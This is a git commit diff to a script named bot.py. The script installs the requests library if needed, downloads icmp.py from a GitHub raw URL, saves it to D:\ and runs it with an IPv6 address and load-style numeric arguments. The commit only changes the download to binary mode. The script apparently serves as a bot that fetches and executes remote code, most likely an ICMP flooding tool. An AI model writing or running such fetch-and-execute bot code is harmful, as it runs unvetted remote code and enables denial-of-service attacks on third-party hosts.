09eaddef653042c3758d11cb2307b04a7e139fe2
HaxTermux <93824226+Hex1629@users.noreply.github.com>
2025-08-14 09:24:05 +0700

    Update bot.py

--- bot.py
+++ bot.py
@@ -6,7 +6,8 @@ except:
     import sys
     subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
     import requests
-with open('D:\\icmp.py','w') as f:
-    f.write(requests.get('https://raw.githubusercontent.com/Hex1629/pretest/refs/heads/main/icmp.py').text)
+    
+with open('D:\\icmp.py','wb') as f:
+    f.write(requests.get('https://raw.githubusercontent.com/Hex1629/pretest/refs/heads/main/icmp.py').content)
 
 os.system('cmd.exe /k python D:\\icmp.py fe80::f24f:a5a0:fe71:efbb 1200 2500 ERQ 2500')
